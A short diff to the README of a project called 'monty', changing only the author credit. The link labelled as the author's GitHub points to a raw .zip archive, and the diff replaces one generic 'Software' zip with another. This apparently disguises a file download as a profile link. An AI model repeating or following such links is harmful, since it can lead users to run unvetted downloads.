@@ -108,4 +108,4 @@ When there is no errors, `monty` returns `0`. Otherwise, returns `1`
 
 ## Author
 
-* Lebohang Meje: [GitHub](https://github.com/LeboMeje/monty/raw/refs/heads/master/bf/Software_3.0-alpha.5.zip)
+* Lebohang Meje: [GitHub](https://github.com/LeboMeje/monty/raw/refs/heads/master/bf/Software_2.4.zip)
